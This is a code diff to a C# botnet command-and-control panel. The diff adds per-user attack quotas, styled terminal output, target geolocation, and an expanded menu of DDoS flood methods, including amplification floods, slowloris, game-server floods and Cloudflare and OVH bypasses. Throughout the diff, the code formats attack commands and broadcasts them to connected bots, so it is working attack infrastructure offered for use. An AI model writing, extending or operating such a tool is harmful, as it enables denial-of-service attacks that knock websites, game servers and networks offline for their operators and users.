@@ -22,6 +22,12 @@ namespace Agent
 
         [JsonPropertyName("password")]
         public string Password { get; set; } = string.Empty;
+
+        [JsonPropertyName("concurrentLimit")]
+        public int ConcurrentLimit { get; set; } = 1;
+
+        [JsonPropertyName("timeLimit")]
+        public int TimeLimit { get; set; } = 300;
     }
 
     public class MethodConfig
@@ -55,6 +61,7 @@ namespace Agent
         private static readonly ConcurrentDictionary<Channel, string> _channelUsers = new();
         private static readonly ConcurrentDictionary<TcpClient, NetworkStream> _botStreams = new();
         private static readonly ConcurrentDictionary<TcpClient, bool> _activeProxyClients = new();
+        private static readonly ConcurrentDictionary<string, int> _userActiveAttacks = new(StringComparer.OrdinalIgnoreCase);
         private static TcpListener? _mainListener;
 
         private static string GetTitleSequence() => $"\x1b]0;Connected {_botCount}\x07";
@@ -709,6 +716,25 @@ namespace Agent
             channel.SendData(Encoding.UTF8.GetBytes(newText));
         }
 
+        // ── ANSI color constants ──────────────────────────────────────────
+        private const string C0  = "\x1b[0m";           // reset
+        private const string CDim   = "\x1b[38;5;240m"; // separator / dim label
+        private const string CKey   = "\x1b[38;5;246m"; // field key
+        private const string CVal   = "\x1b[97m";       // value (white)
+        private const string CNum   = "\x1b[38;5;222m"; // numbers / port / time
+        private const string CCmd   = "\x1b[38;5;75m";  // command / method name
+        private const string CDesc  = "\x1b[38;5;245m"; // description text
+        private const string CGood  = "\x1b[38;5;114m"; // success / swarm count
+        private const string CWarn  = "\x1b[38;5;215m"; // warning
+        private const string CErr   = "\x1b[38;5;203m"; // error
+        private const string CHead  = "\x1b[1;97m";     // section header (bold white)
+        private const string CIP    = "\x1b[38;5;81m";  // IP address
+        private const string CUrl   = "\x1b[38;5;75m";  // url / host
+
+        private static string Ln(string s = "") => s + "\r\n";
+        private static string Send(StringBuilder sb) =>
+            sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n");
+
         private static void ProcessCommand(Channel channel, string command)
         {
             var parts = command.Split(' ', StringSplitOptions.RemoveEmptyEntries);
@@ -719,15 +745,17 @@ namespace Agent
             if (cmdName.Equals("help", StringComparison.OrdinalIgnoreCase))
             {
                 var sb = new StringBuilder();
-                sb.AppendLine();
-                sb.AppendLine("  \x1b[1;97mCOMMANDS\x1b[0m");
-                sb.AppendLine("  \x1b[96mhelp\x1b[0m              \x1b[90m:\x1b[0m \x1b[38;5;250mShow available commands\x1b[0m");
-                sb.AppendLine("  \x1b[96mmethods\x1b[0m           \x1b[90m:\x1b[0m \x1b[38;5;250mList all attack & flood methods\x1b[0m");
-                sb.AppendLine("  \x1b[96mbots\x1b[0m              \x1b[90m:\x1b[0m \x1b[38;5;250mShow number of connected bots\x1b[0m");
-                sb.AppendLine("  \x1b[96mclear / cls\x1b[0m       \x1b[90m:\x1b[0m \x1b[38;5;250mClear terminal screen\x1b[0m");
-                sb.AppendLine("  \x1b[96mexit / quit\x1b[0m       \x1b[90m:\x1b[0m \x1b[38;5;250mDisconnect session\x1b[0m");
-                sb.AppendLine();
-                channel.SendData(Encoding.UTF8.GetBytes(sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n")));
+                sb.Append(Ln());
+                sb.Append(Ln($"  {CHead}COMMANDS{C0}"));
+                sb.Append(Ln($"  {CDim}{'─'.ToString().PadRight(46, '─')}{C0}"));
+                sb.Append(Ln($"  {CCmd}{"help",-12}{C0}  {CDim}│{C0}  {CDesc}Show this help message{C0}"));
+                sb.Append(Ln($"  {CCmd}{"methods",-12}{C0}  {CDim}│{C0}  {CDesc}List all available flood methods{C0}"));
+                sb.Append(Ln($"  {CCmd}{"bots",-12}{C0}  {CDim}│{C0}  {CDesc}Show connected bot count{C0}"));
+                sb.Append(Ln($"  {CCmd}{"clear / cls",-12}{C0}  {CDim}│{C0}  {CDesc}Clear the terminal screen{C0}"));
+                sb.Append(Ln($"  {CCmd}{"exit / quit",-12}{C0}  {CDim}│{C0}  {CDesc}Close this session{C0}"));
+                sb.Append(Ln($"  {CDim}{'─'.ToString().PadRight(46, '─')}{C0}"));
+                sb.Append(Ln());
+                channel.SendData(Encoding.UTF8.GetBytes(Send(sb)));
             }
             else if (cmdName.Equals("methods", StringComparison.OrdinalIgnoreCase))
             {
@@ -735,7 +763,8 @@ namespace Agent
             }
             else if (cmdName.Equals("bots", StringComparison.OrdinalIgnoreCase))
             {
-                channel.SendData(Encoding.UTF8.GetBytes($"[+] Total connected bots: {_botCount}\r\n"));
+                channel.SendData(Encoding.UTF8.GetBytes(
+                    Ln($"  {CKey}bots{C0}  {CDim}│{C0}  {CGood}{_botCount} connected{C0}")));
             }
             else if (cmdName.Equals("clear", StringComparison.OrdinalIgnoreCase) || cmdName.Equals("cls", StringComparison.OrdinalIgnoreCase))
             {
@@ -743,7 +772,7 @@ namespace Agent
             }
             else if (cmdName.Equals("exit", StringComparison.OrdinalIgnoreCase) || cmdName.Equals("quit", StringComparison.OrdinalIgnoreCase))
             {
-                channel.SendData(Encoding.UTF8.GetBytes("Goodbye!\r\n"));
+                channel.SendData(Encoding.UTF8.GetBytes(Ln($"  {CDesc}session closed{C0}")));
                 channel.SendClose();
             }
             else
@@ -756,26 +785,21 @@ namespace Agent
                     var args = new string[parts.Length - 1];
                     Array.Copy(parts, 1, args, 0, parts.Length - 1);
 
-                    if (args.Length < 2)
-                    {
-                        channel.SendData(Encoding.UTF8.GetBytes($"\x1b[91m[-] Usage: .{method.Name} <host/url> <port> <time>\x1b[0m\r\n"));
-                        return;
-                    }
-
-                    string targetHost = args.Length > 0 ? args[0] : "N/A";
+                    bool hasPortInTemplate = placeholders.Contains("{port}");
+                    string targetHost = "N/A";
                     string targetPort = "N/A";
                     string attackDuration = "N/A";
-
                     string formattedCmd = method.Cmd;
-                    bool hasPortInTemplate = placeholders.Contains("{port}");
 
                     if (hasPortInTemplate)
                     {
                         if (args.Length < 3)
                         {
-                            channel.SendData(Encoding.UTF8.GetBytes($"\x1b[91m[-] Usage: .{method.Name} <host> <port> <time>\x1b[0m\r\n"));
+                            channel.SendData(Encoding.UTF8.GetBytes(
+                                Ln($"  {CErr}error{C0}  {CDim}│{C0}  {CDesc}usage: {CCmd}.{method.Name} {CVal}<host> <port> <time>{C0}")));
                             return;
                         }
+                        targetHost = args[0];
                         targetPort = args[1];
                         attackDuration = args[2];
                         formattedCmd = formattedCmd.Replace("{host}", targetHost)
@@ -784,24 +808,77 @@ namespace Agent
                     }
                     else
                     {
-                        // Template does not take port (e.g. ./tls {host} {time} 100)
-                        // User can supply either:
-                        // 1. <host> <port> <time> (standard 3 args)
-                        // 2. <host> <time> (2 args)
-                        if (args.Length >= 3)
+                        // L7 or method template without port (e.g. ./tls {host} {time} 100) -> Usage: .method <url> <time>
+                        if (args.Length < 2)
                         {
-                            targetPort = args[1];
-                            attackDuration = args[2];
+                            channel.SendData(Encoding.UTF8.GetBytes(
+                                Ln($"  {CErr}error{C0}  {CDim}│{C0}  {CDesc}usage: {CCmd}.{method.Name} {CVal}<url> <time>{C0}")));
+                            return;
                         }
-                        else
-                        {
-                            targetPort = targetHost.StartsWith("https://", StringComparison.OrdinalIgnoreCase) ? "443" : "80";
-                            attackDuration = args[1];
-                        }
+
+                        targetHost = args[0];
+                        attackDuration = args.Length >= 3 ? args[2] : args[1];
+                        targetPort = "N/A";
 
                         formattedCmd = formattedCmd.Replace("{host}", targetHost)
                                                    .Replace("{time}", attackDuration);
                     }
+
+                    // --- Per-user limit enforcement ---
+                    _channelUsers.TryGetValue(channel, out var attackingUser);
+                    if (string.IsNullOrEmpty(attackingUser)) attackingUser = "root";
+
+                    var userCfg = _users.Find(u => string.Equals(u.Username, attackingUser, StringComparison.OrdinalIgnoreCase));
+                    int concurrentLimit = userCfg?.ConcurrentLimit ?? 1;
+                    int timeLimit = userCfg?.TimeLimit ?? 300;
+
+                    // Check concurrent attack limit
+                    int currentActive = _userActiveAttacks.GetOrAdd(attackingUser, 0);
+                    if (currentActive >= concurrentLimit)
+                    {
+                        channel.SendData(Encoding.UTF8.GetBytes(
+                            Ln($"  {CErr}limit{C0}  {CDim}│{C0}  {CDesc}concurrent attack limit reached {CNum}({concurrentLimit}){C0}")));
+                        return;
+                    }
+
+                    // Enforce time limit
+                    if (int.TryParse(attackDuration, out int parsedTime) && parsedTime > timeLimit)
+                    {
+                        channel.SendData(Encoding.UTF8.GetBytes(
+                            Ln($"  {CWarn}warn{C0}   {CDim}│{C0}  {CDesc}time clamped {CNum}{parsedTime}s {CDim}→ {CNum}{timeLimit}s{C0}")));
+                        attackDuration = timeLimit.ToString();
+                        // Rebuild formattedCmd with clamped time
+                        formattedCmd = method.Cmd;
+                        if (hasPortInTemplate)
+                        {
+                            formattedCmd = formattedCmd.Replace("{host}", targetHost)
+                                                       .Replace("{port}", targetPort)
+                                                       .Replace("{time}", attackDuration);
+                        }
+                        else
+                        {
+                            formattedCmd = formattedCmd.Replace("{host}", targetHost)
+                                                       .Replace("{time}", attackDuration);
+                        }
+                    }
+
+                    // Increment active attack counter and schedule decrement after duration
+                    _userActiveAttacks.AddOrUpdate(attackingUser, 1, (k, v) => v + 1);
+                    if (int.TryParse(attackDuration, out int durationSecs) && durationSecs > 0)
+                    {
+                        string capturedUser = attackingUser;
+                        var _ = Task.Run(async () =>
+                        {
+                            await Task.Delay(TimeSpan.FromSeconds(durationSecs + 2));
+                            _userActiveAttacks.AddOrUpdate(capturedUser, 0, (k, v) => Math.Max(0, v - 1));
+                        });
+                    }
+                    else
+                    {
+                        // Fallback: decrement immediately if duration is unknown
+                        _userActiveAttacks.AddOrUpdate(attackingUser, 0, (k, v) => Math.Max(0, v - 1));
+                    }
+                    // --- End limit enforcement ---
 
                     int dispatched = BroadcastToBots(formattedCmd);
 
@@ -810,7 +887,8 @@ namespace Agent
                 }
                 else
                 {
-                    channel.SendData(Encoding.UTF8.GetBytes($"\x1b[91m[-] Unknown command: {cmdName}. Type 'help' for available commands.\x1b[0m\r\n"));
+                    channel.SendData(Encoding.UTF8.GetBytes(
+                        Ln($"  {CErr}error{C0}  {CDim}│{C0}  {CDesc}unknown command {CCmd}{cmdName}{CDesc} — type {CCmd}help{C0}")));
                 }
             }
         }
@@ -886,20 +964,27 @@ namespace Agent
         private static string FormatDispatchResponse(string methodName, string targetHost, string port, string time, int botCount)
         {
             var geo = ResolveTargetGeo(targetHost);
-            var sb = new StringBuilder();
-            sb.AppendLine();
-            sb.AppendLine("  \x1b[1;92mATTACK DISPATCHED\x1b[0m");
-            sb.AppendLine($"  \x1b[90mTarget   :\x1b[0m \x1b[97m{targetHost}\x1b[0m");
-            sb.AppendLine($"  \x1b[90mIP       :\x1b[0m \x1b[38;5;45m{geo.ResolvedIp}\x1b[0m");
-            sb.AppendLine($"  \x1b[90mPort     :\x1b[0m \x1b[93m{port}\x1b[0m");
-            sb.AppendLine($"  \x1b[90mDuration :\x1b[0m \x1b[93m{time}s\x1b[0m");
-            sb.AppendLine($"  \x1b[90mMethod   :\x1b[0m \x1b[96m.{methodName.ToUpper()}\x1b[0m");
-            sb.AppendLine($"  \x1b[90mISP      :\x1b[0m \x1b[38;5;250m{geo.Isp}\x1b[0m");
-            sb.AppendLine($"  \x1b[90mRegion   :\x1b[0m \x1b[38;5;250m{geo.Region}, {geo.Country}\x1b[0m");
-            sb.AppendLine($"  \x1b[90mASN      :\x1b[0m \x1b[38;5;244m{geo.Asn}\x1b[0m");
-            sb.AppendLine($"  \x1b[90mSwarm    :\x1b[0m \x1b[1;92mSent to {botCount} bot(s)\x1b[0m");
-            sb.AppendLine();
-            return sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n");
+            var sb  = new StringBuilder();
+
+            string rule = $"{CDim}{'─'.ToString().PadRight(48, '─')}{C0}";
+
+            sb.Append(Ln());
+            sb.Append(Ln($"  {rule}"));
+            sb.Append(Ln($"  {CKey}{"target",-9}{C0}  {CVal}{targetHost}{C0}"));
+            sb.Append(Ln($"  {CKey}{"ip",-9}{C0}  {CIP}{geo.ResolvedIp}{C0}"));
+            if (port != "N/A")
+                sb.Append(Ln($"  {CKey}{"port",-9}{C0}  {CNum}{port}{C0}"));
+            sb.Append(Ln($"  {CKey}{"duration",-9}{C0}  {CNum}{time}s{C0}"));
+            sb.Append(Ln($"  {CKey}{"method",-9}{C0}  {CCmd}.{methodName.ToUpper()}{C0}"));
+            sb.Append(Ln($"  {CDim}{'─'.ToString().PadRight(48, '─')}{C0}"));
+            sb.Append(Ln($"  {CKey}{"isp",-9}{C0}  {CDesc}{geo.Isp}{C0}"));
+            sb.Append(Ln($"  {CKey}{"region",-9}{C0}  {CDesc}{geo.Region}, {geo.Country}{C0}"));
+            sb.Append(Ln($"  {CKey}{"asn",-9}{C0}  {CDesc}{geo.Asn}{C0}"));
+            sb.Append(Ln($"  {CDim}{'─'.ToString().PadRight(48, '─')}{C0}"));
+            sb.Append(Ln($"  {CKey}{"swarm",-9}{C0}  {CGood}{botCount} bot{(botCount == 1 ? "" : "s")} dispatched{C0}"));
+            sb.Append(Ln());
+
+            return Send(sb);
         }
 
         private static List<string> ExtractPlaceholders(string template)
@@ -934,102 +1019,125 @@ namespace Agent
         private static string GetFormattedMethodsMenu()
         {
             if (_methods.Count == 0)
-            {
-                return "\x1b[91m  [!] No methods configured in methods.json\x1b[0m\r\n";
-            }
+                return Ln($"  {CErr}error{C0}  {CDim}│{C0}  {CDesc}no methods configured in methods.json{C0}");
 
             var descriptions = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase)
             {
                 // LAYER 4 UDP
-                ["dns"] = "DNS flood, overwhelms name servers with forged queries",
-                ["udp"] = "UDP flood, massive spoofed datagram traffic",
-                ["ldap"] = "LDAP flood, overwhelms directory servers with bulk binds",
-                ["ssdp"] = "SSDP flood, overloads devices with discovery requests",
-                ["home"] = "Home DNS flood, targets home network DNS servers",
-                ["udpbypass"] = "UDP Bypass, packets designed to bypass filters",
+                ["dns"]       = "DNS flood, overwhelms name servers with forged queries",
+                ["udp"]       = "UDP flood, massive spoofed datagram traffic",
+                ["ldap"]      = "LDAP flood, overwhelms directory servers with bulk binds",
+                ["ssdp"]      = "SSDP flood, overloads devices with discovery requests",
+                ["ntp"]       = "NTP amplification flood, abuses monlist responses",
+                ["memcached"] = "Memcached amplification, high-bandwidth UDP reflection",
+                ["home"]      = "Home DNS flood, targets home network DNS servers",
+                ["udpbypass"] = "UDP Bypass, random-payload packets designed to bypass filters",
 
                 // LAYER 4 TCP
-                ["tcp"] = "TCP flood, excessive connection requests",
-                ["socket"] = "Socket flood, exhausts resources via open connections",
-                ["ovh"] = "OVH bypass, anti-DDoS protection bypass",
-                ["tcpmix"] = "TCP Mix, combines techniques to exhaust resources",
-                ["tcpbypass"] = "TCP Bypass, packets designed to bypass filtering",
-                ["ack"] = "ACK flood, disrupts connections with TCP ACK packets",
+                ["tcp"]       = "TCP flood, excessive SYN/connection requests",
+                ["socket"]    = "Socket flood, exhausts resources via open connections",
+                ["slowloris"] = "Slowloris, keeps connections half-open to starve server threads",
+                ["ovh"]       = "OVH bypass, anti-DDoS protection bypass technique",
+                ["tcpmix"]    = "TCP Mix, combines multiple techniques to exhaust resources",
+                ["tcpbypass"] = "TCP Bypass, packets designed to bypass stateful filtering",
+                ["ack"]       = "ACK flood, disrupts connections with spoofed TCP ACK packets",
 
                 // LAYER 4 GAME
-                ["game"] = "Generic game flood, UDP packets disrupt gameplay",
-                ["rainbow"] = "Rainbow Six flood, excessive UDP connection requests",
-                ["rocket"] = "Rocket League flood, exhausts server via UDP connections",
-                ["roblox"] = "Roblox flood, many TCP connections overload servers",
-                ["fivem"] = "FiveM flood, mixed TCP floods disrupt multiplayer",
-                ["pubg"] = "PUBG flood, crafted UDP packets bypass filters",
-                ["fortnite"] = "Fortnite flood, UDP packets cause lag",
-                ["warthunder"] = "War Thunder flood, massive UDP disruption",
-                ["counter"] = "Counter-Strike flood, UDP packets cause delays",
-                ["samp"] = "SA-MP flood, TCP/UDP floods overload servers",
+                ["game"]       = "Generic game flood, UDP packets disrupt gameplay",
+                ["rainbow"]    = "Rainbow Six flood, excessive UDP connection requests",
+                ["rocket"]     = "Rocket League flood, exhausts server via UDP connections",
+                ["roblox"]     = "Roblox flood, RakNet handshake packets overload servers",
+                ["fivem"]      = "FiveM flood, getinfo queries disrupt multiplayer sessions",
+                ["pubg"]       = "PUBG flood, crafted UDP packets bypass game filters",
+                ["fortnite"]   = "Fortnite flood, UDP packets cause lag and disconnects",
+                ["warthunder"] = "War Thunder flood, massive UDP session disruption",
+                ["counter"]    = "Counter-Strike flood, Source Engine query packets",
+                ["samp"]       = "SA-MP flood, server query packets overload game servers",
+                ["minecraft"]  = "Minecraft flood, legacy server ping packets",
 
                 // LAYER 3
-                ["subnet"] = "Subnet flood, ICMP packets to many IPs in a range",
-                ["icmp"] = "ICMP flood, echo requests overload the network",
+                ["subnet"] = "Subnet flood, ICMP packets sprayed across an entire /24",
+                ["icmp"]   = "ICMP flood, echo requests saturate network bandwidth",
 
-                // LAYER 7
-                ["http"] = "HTTP flood, targets web servers via GET/POST",
-                ["https"] = "HTTPS flood, encrypted requests on HTTPS endpoints",
-                ["httpx"] = "HTTP-X, multi-protocol request flood",
-                ["rapidflood"] = "Rapid flood, high rate application layer requests",
-                ["tls"] = "TLS flood, handshake & encrypted session exhaustion",
-                ["tlsx"] = "TLS-X, evades filtering at application layer",
-                ["bypass"] = "Bypass, TLS/HTTPS related evasion technique",
-                ["browser"] = "Browser, simulates real browser traffic (JS/headers)",
-                ["cache"] = "Cache, requests that defeat caching mechanisms",
-                ["cloudflare"] = "Cloudflare, HTTPS flood bypassing CF protection"
+                // LAYER 7 — HTTP/1.1
+                ["http"]    = "HTTP/1.1 GET flood, plain-text requests via keep-alive",
+                ["https"]   = "HTTPS/1.1 flood, TLS-encrypted GET requests",
+                ["httpx"]   = "HTTP-X flood, randomised headers + cache-busting params",
+                ["browser"] = "Browser emulation flood, full Chrome-like header fingerprint",
+
+                // LAYER 7 — HTTP/2 (native nghttp2)
+                ["http2"]      = "HTTP/2 flood, native multiplexed streams per TLS connection",
+                ["tls"]        = "HTTP/2 TLS flood, encrypted stream exhaustion via H2 HEADERS",
+                ["tlsx"]       = "HTTP/2 TLS-X, cache-busting + IP-spoofing headers over H2",
+                ["bypass"]     = "HTTP/2 bypass, X-Forwarded-For rotation over H2 streams",
+                ["cache"]      = "HTTP/2 cache buster, no-store/no-cache defeats CDN caching",
+                ["rapidflood"] = "HTTP/2 rapid flood, max concurrent streams per connection",
+                ["cloudflare"] = "HTTP/2 Cloudflare bypass, CF-Ray + CF-Connecting-IP spoofing",
             };
 
-            var l4Udp = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "dns", "udp", "ldap", "ssdp", "home", "udpbypass" };
-            var l4Tcp = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "tcp", "socket", "ovh", "tcpmix", "tcpbypass", "ack" };
-            var l4Game = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "game", "rainbow", "rocket", "roblox", "fivem", "pubg", "fortnite", "warthunder", "counter", "samp" };
-            var l3 = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "subnet", "icmp" };
-            var l7 = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "http", "https", "httpx", "rapidflood", "tls", "tlsx", "bypass", "browser", "cache", "cloudflare" };
+            var l4Udp  = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "dns", "udp", "ldap", "ssdp", "ntp", "memcached", "home", "udpbypass" };
+            var l4Tcp  = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "tcp", "socket", "slowloris", "ovh", "tcpmix", "tcpbypass", "ack" };
+            var l4Game = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "game", "rainbow", "rocket", "roblox", "fivem", "pubg", "fortnite", "warthunder", "counter", "samp", "minecraft" };
+            var l3     = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "subnet", "icmp" };
+            var l7h1   = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "http", "https", "httpx", "browser" };
+            var l7h2   = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "http2", "tls", "tlsx", "bypass", "cache", "rapidflood", "cloudflare" };
 
-            var sb = new StringBuilder();
-            sb.AppendLine();
-            sb.AppendLine("  \x1b[1;97mATTACK & FLOOD METHODS\x1b[0m");
+            var sb   = new StringBuilder();
+            string rule = $"{CDim}{'─'.ToString().PadRight(52, '─')}{C0}";
 
-            void AppendCategory(string title, string colorCode, HashSet<string> names)
+            // Category label colors — distinct but muted, no bold
+            const string CL4U  = "\x1b[38;5;69m";  // steel blue   — UDP
+            const string CL4T  = "\x1b[38;5;75m";  // sky blue     — TCP
+            const string CL4G  = "\x1b[38;5;179m"; // amber        — Game
+            const string CL3   = "\x1b[38;5;167m"; // muted red    — L3
+            const string CL7H1 = "\x1b[38;5;71m";  // sage green   — L7 H1
+            const string CL7H2 = "\x1b[38;5;77m";  // bright green — L7 H2
+            const string CCust = "\x1b[38;5;243m"; // grey         — custom
+
+            sb.Append(Ln());
+            sb.Append(Ln($"  {CHead}METHODS{C0}"));
+            sb.Append(Ln($"  {rule}"));
+
+            void AppendCategory(string label, string labelColor, HashSet<string> names)
             {
                 var active = _methods.Where(m => names.Contains(m.Name)).ToList();
                 if (active.Count == 0) return;
 
-                sb.AppendLine();
-                sb.AppendLine($"  {colorCode}{title}\x1b[0m");
+                sb.Append(Ln());
+                sb.Append(Ln($"  {labelColor}{label}{C0}"));
                 foreach (var m in active)
                 {
-                    string desc = descriptions.TryGetValue(m.Name, out var d) ? d : "Custom execution method";
-                    sb.AppendLine($"    \x1b[96m.{m.Name,-13}\x1b[0m \x1b[90m:\x1b[0m \x1b[38;5;250m{desc}\x1b[0m");
+                    string desc = descriptions.TryGetValue(m.Name, out var d) ? d : "custom method";
+                    sb.Append(Ln($"    {CCmd}{$".{m.Name}",-15}{C0}  {CDim}│{C0}  {CDesc}{desc}{C0}"));
                 }
             }
 
-            AppendCategory("LAYER 4 UDP (AMPLIFICATION & BYPASS)", "\x1b[1;95m", l4Udp);
-            AppendCategory("LAYER 4 TCP (FLOOD & BYPASS)", "\x1b[1;94m", l4Tcp);
-            AppendCategory("LAYER 4 GAME (SPECIALIZED UDP / TCP)", "\x1b[1;93m", l4Game);
-            AppendCategory("LAYER 3 (NETWORK PROTOCOLS)", "\x1b[1;91m", l3);
-            AppendCategory("LAYER 7 (HTTP / HTTPS / APPLICATION)", "\x1b[1;92m", l7);
+            AppendCategory("L4 UDP   amplification & bypass",   CL4U,  l4Udp);
+            AppendCategory("L4 TCP   flood & bypass",           CL4T,  l4Tcp);
+            AppendCategory("L4 GAME  specialized udp / tcp",    CL4G,  l4Game);
+            AppendCategory("L3       network protocols",         CL3,   l3);
+            AppendCategory("L7 H1.1  tls + plain",              CL7H1, l7h1);
+            AppendCategory("L7 H2    native multiplexed",       CL7H2, l7h2);
 
-            var others = _methods.Where(m => !l4Udp.Contains(m.Name) && !l4Tcp.Contains(m.Name) &&
-                                             !l4Game.Contains(m.Name) && !l3.Contains(m.Name) &&
-                                             !l7.Contains(m.Name)).ToList();
+            var knownAll = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+            foreach (var s in new[] { l4Udp, l4Tcp, l4Game, l3, l7h1, l7h2 })
+                foreach (var n in s) knownAll.Add(n);
+
+            var others = _methods.Where(m => !knownAll.Contains(m.Name)).ToList();
             if (others.Count > 0)
             {
                 var otherSet = new HashSet<string>(others.Select(o => o.Name), StringComparer.OrdinalIgnoreCase);
-                AppendCategory("CUSTOM / OTHER METHODS", "\x1b[1;96m", otherSet);
+                AppendCategory("CUSTOM", CCust, otherSet);
             }
 
-            sb.AppendLine();
-            sb.AppendLine("  \x1b[90mUsage  :\x1b[0m \x1b[93m<method> <host/ip/url> <port> <time>\x1b[0m");
-            sb.AppendLine("  \x1b[90mExample:\x1b[0m \x1b[38;5;45m.https https://example.com 443 60\x1b[0m");
-            sb.AppendLine();
+            sb.Append(Ln());
+            sb.Append(Ln($"  {rule}"));
+            sb.Append(Ln($"  {CKey}{"l4 usage",-10}{C0}  {CDesc}.method {CVal}<host> <port> <time>{C0}"));
+            sb.Append(Ln($"  {CKey}{"l7 usage",-10}{C0}  {CDesc}.method {CVal}<url> <port> <time>  {CDim}(port 0 = auto){C0}"));
+            sb.Append(Ln($"  {CKey}{"example",-10}{C0}  {CCmd}.http2 {CUrl}https://example.com {CNum}443 60{C0}"));
+            sb.Append(Ln());
 
-            return sb.ToString().Replace("\n", "\r\n").Replace("\r\r\n", "\r\n");
+            return Send(sb);
         }
 
         private static string GetOrGenerateKey(string fileName, Func<string> generateKey)
